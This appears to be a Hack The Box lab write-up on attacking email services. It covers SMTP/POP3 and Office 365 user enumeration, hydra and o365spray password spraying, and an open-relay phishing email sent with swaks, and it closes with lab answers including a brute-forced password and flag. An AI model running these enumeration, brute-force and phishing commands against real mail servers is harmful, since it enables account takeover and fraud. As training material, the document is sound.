# Attacking Email Services
## Enumeration
We can use the **Mail eXchanger** (`MX`) DNS record to identify a mail server. The `MX` record specifies the mail server responsible for accepting email messages on behalf of a domain name.

We can use tools such as `host` or `dig` and online websites such as [MXToolbox](https://mxtoolbox.com/) to query information about the `MX` records:

```sh
$ host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.

# or
$ dig mx inlanefreight.com | grep "MX" | grep -v ";"

inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.

$ host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
```

If we are targetting a custom mail server implementation such as `inlanefreight.htb`, we can enumerate the following ports:
<table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Port</strong></th>
<th><strong>Service</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>TCP/25</code></td>
<td>SMTP Unencrypted</td>
</tr>
<tr>
<td><code>TCP/143</code></td>
<td>IMAP4 Unencrypted</td>
</tr>
<tr>
<td><code>TCP/110</code></td>
<td>POP3 Unencrypted</td>
</tr>
<tr>
<td><code>TCP/465</code></td>
<td>SMTP Encrypted</td>
</tr>
<tr>
<td><code>TCP/587</code></td>
<td>SMTP Encrypted/<a href="https://en.wikipedia.org/wiki/Opportunistic_TLS" target="_blank" rel="noopener nofollow">STARTTLS</a></td>
</tr>
<tr>
<td><code>TCP/993</code></td>
<td>IMAP4 Encrypted</td>
</tr>
<tr>
<td><code>TCP/995</code></td>
<td>POP3 Encrypted</td>
</tr>
</tbody>
</table>

```sh
$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

## Misconfigurations
### Authentication
The SMTP server has different commands that can be used to enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. 

`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.

```sh
$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

`EXPN` is similar to VRFY, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the VRFY command since sites often have an alias such as "all."

```sh
$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.

```sh
$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```

We can also use the POP3 protocol to enumerate users depending on the service implementation. For example, we can use the command `USER` followed by the username, and if the server responds `OK`. This means that the user exists on the server.

```sh
$ telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
```

To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). We can specify the enumeration mode with the argument `-M` followed by `VRFY`, `EXPN`, or `RCPT`, and the argument `-U` with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument `-D`. Finally, we specify the target with the argument `-t`.

```sh
$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
```

## Cloud Enumeration
[O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365).

Let's first validate if our target domain is using Office 365.

```sh
$ python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

Now, we can attempt to identify usernames.

```sh
$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03

>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
```

## Password Attacks
### Hydra - Password Attack

```sh
$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

### O365 Spray - Password Spraying

```sh
$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

## Protocol Specifics Attacks
An open relay is a SMTP server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.

### Open Relay
With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay.

```sh
$ nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

Next, we can use any mail client to connect to the mail server and send our email.

```sh
$ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

## Questions
1. What is the available username for the domain inlanefreight.htb in the SMTP server? **Answer: marlin**
   - Enumerate user using `smtp-user-enum` with the user list from the HTB provided resource:
      ```sh
      $ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.36.63
      Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

      ----------------------------------------------------------
      |                   Scan Information                       |
      ----------------------------------------------------------

      Mode ..................... RCPT
      Worker Processes ......... 5
      Usernames file ........... users.list
      Target count ............. 1
      Username count ........... 79
      Target TCP port .......... 25
      Query timeout ............ 5 secs
      Target domain ............ inlanefreight.htb

      ######## Scan started at Tue Feb 10 23:03:38 2026 #########
      10.129.36.63: marlin@inlanefreight.htb exists
      ######## Scan completed at Tue Feb 10 23:03:59 2026 #########
      1 results.
      ```
2. Access the email account using the user credentials that you discovered and submit the flag in the email as your answer. **Answer: HTB{w34k_p4$$w0rd}**
   - Brute-force the password using the HTB provided resource:
      ```sh
      $ hydra -l marlin@inlanefreight.htb -P pws.list -f 10.129.36.63 pop3
      <SNIP>
      [110][pop3] host: 10.129.36.63   login: marlin@inlanefreight.htb   password: poohbear
      [STATUS] attack finished for 10.129.36.63 (valid pair found)
      1 of 1 target successfully completed, 1 valid password found
      <SNIP>
      ```
   - Interact with email server and retrieve the flag:
      ```sh
      $ telnet 10.129.36.63 110
      Trying 10.129.36.63...
      Connected to 10.129.36.63.
      Escape character is '^]'.
      +OK POP3
      USER marlin@inlanefreight.htb
      +OK Send your password
      PASS poohbear
      +OK Mailbox locked and ready
      LIST
      +OK 1 messages (601 octets)
      1 601
      .
      RETR 1
      +OK 601 octets
      Return-Path: marlin@inlanefreight.htb
      Received: from [10.10.14.33] (Unknown [10.10.14.33])
         by WINSRV02 with ESMTPA
         ; Wed, 20 Apr 2022 14:49:32 -0500
      Message-ID: <85cb72668d8f5f8436d36f085e0167ee78cf0638.camel@inlanefreight.htb>
      Subject: Password change
      From: marlin <marlin@inlanefreight.htb>
      To: administrator@inlanefreight.htb
      Cc: marlin@inlanefreight.htb
      Date: Wed, 20 Apr 2022 15:49:11 -0400
      Content-Type: text/plain; charset="UTF-8"
      User-Agent: Evolution 3.38.3-1 
      MIME-Version: 1.0
      Content-Transfer-Encoding: 7bit

      Hi admin,

      How can I change my password to something more secure? 

      flag: HTB{w34k_p4$$w0rd}
      ```